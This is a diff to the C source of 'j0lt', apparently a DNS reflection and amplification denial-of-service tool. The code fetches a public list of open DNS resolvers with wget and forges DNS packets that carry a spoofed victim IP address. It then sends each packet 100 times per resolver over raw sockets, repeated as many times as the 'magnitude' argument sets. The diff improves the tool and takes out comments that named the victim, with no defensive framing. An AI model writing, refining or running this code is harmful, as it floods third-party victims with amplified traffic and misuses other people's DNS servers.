@@ -211,7 +211,7 @@ DEFINE_INSERT_FN(qword, uint64_t)
 const char* g_path = "/tmp/resolv.txt";
 char* g_wget[ ] = {
     "/bin/wget", "-O", "/tmp/resolv.txt",
-    "https://raw.githubusercontent.com/thesc1entist/j0lt/main/j0lt-resolv.txt",
+    "https://public-dns.info/nameservers.txt",
     NULL
 };
 // END SYSTEM() AND READ() 
@@ -233,12 +233,12 @@ PackDNSHeader(DNSHEADER* dnshdr);
 void
 PackUDPHeader(UDPHEADER* udphdr, PSEUDOHDR* pseudohdr, uint16_t spoofport, size_t nwritten);
 void
-PackIPHeadr(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, uint32_t resolvip, uint32_t spoofip, size_t nwritten, size_t udpsz);
+PackIPHeader(IPHEADER* iphdr, PSEUDOHDR* pseudohdr, uint32_t resolvip, uint32_t spoofip, size_t nwritten, size_t udpsz);
 bool
 InsertData(void** dst, size_t* dst_buflen, const void* src, size_t src_len);
 uint16_t
 CheckSum(const uint16_t* addr, size_t count);
-void
+bool
 SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten);
 void
 PrintHex(void* data, size_t len);
@@ -251,33 +251,33 @@ main(int argc, char** argv)
 {
     FILE* fptr;
     char payload[ NS_PACKETSZ ], lineptr[ MAX_LINE_SZ_J0LT ];
-    int status;
+    int status, i;
     size_t szpayload, nread, szpewpew;
     uint32_t spoofip, resolvip;
-    uint16_t spoofport, attacksz;
+    uint16_t spoofport, magnitude;
     pid_t pid;
 
     printf("%s", g_ansi);
     if (argc != 4)
         goto fail_state;
 
-    spoofip = inet_addr(argv[ 1 ]); // spoofed ip address to victim
+    spoofip = inet_addr(argv[ 1 ]);
     if (spoofip == 0)
         goto fail_state;
 
     errno = 0;
-    spoofport = ( uint16_t ) strtol(argv[ 2 ], NULL, 0); // port to victim
-    attacksz = ( uint16_t ) strtol(argv[ 3 ], NULL, 0); // size of attack.
+    spoofport = ( uint16_t ) strtol(argv[ 2 ], NULL, 0);
+    magnitude = ( uint16_t ) strtol(argv[ 3 ], NULL, 0);
     if (errno != 0)
         goto fail_state;
 
     if ((pid = fork( )) < 0) {
-        printf("forking child process failed\n");
+        printf("* forking child process failed\n");
         _exit(EXIT_FAILURE);
     }
     else if (pid == 0) {
         if (execv(*g_wget, g_wget) < 0) {
-            printf("exec failed\n");
+            printf("* exec failed\n");
             _exit(EXIT_FAILURE);
         }
     }
@@ -286,37 +286,38 @@ main(int argc, char** argv)
             ;
     }
 
-    printf("+ resolv list saved to %s\n", g_path);
-
     fptr = fopen(g_path, "r");
     if (fptr == NULL)
         goto fail_state;
 
-    while (attacksz >= 1) {
-        printf("+ current attack size %d \n", attacksz);
+    printf("+ resolv list saved to %s\n", g_path);
+    while (magnitude >= 1) {
+        printf("+ current attack magnitude %d \n", magnitude);
         while (fgets(lineptr, MAX_LINE_SZ_J0LT, fptr) != NULL) {
-            if (!isdigit(lineptr[ 0 ]))
-                continue;
             nread = strlen(lineptr);
             lineptr[ nread - 1 ] = '\0';
+            for (i = 0; isdigit(lineptr[ i ]); i++)
+                ;
+            if (lineptr[ i ] != '.')
+                continue;
             resolvip = inet_addr(lineptr);
             if (resolvip == 0)
                 continue;
-            szpewpew = 100;
             szpayload = ForgeJ0ltPacket(payload, htonl(resolvip), htonl(spoofip), spoofport);
 #if !DEBUG  
-            while (szpewpew-- > 0) {
+            szpewpew = 100;
+            while (szpewpew-- > 0)
                 SendPayload(payload, resolvip, htons(NS_DEFAULTPORT), szpayload);
-            }
 #else 
             PrintHex(payload, szpayload);
 #endif
         }
-        attacksz--;
+        magnitude--;
         rewind(fptr);
     }
 
     remove(g_path);
+    printf("- resolv list removed from %s\n", g_path);
     fclose(fptr);
 
     return 0;
@@ -390,7 +391,7 @@ PrintHex(void* data, size_t len)
 }
 
 
-void
+bool
 SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t nwritten)
 {
     int raw_sockfd;
@@ -399,7 +400,9 @@ SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t n
 
     raw_sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if (raw_sockfd == -1) {
-        perror("fatal socket error");
+        remove(g_path);
+        printf("- resolv list removed from %s\n", g_path);
+        perror("* fatal socket error");
         exit(EXIT_FAILURE);
     }
 
@@ -417,6 +420,7 @@ SendPayload(const uint8_t* datagram, uint32_t daddr, uint16_t uh_dport, size_t n
     );
 
     close(raw_sockfd);
+    return !(nread == -1 || nread != nwritten);
 }
 
 
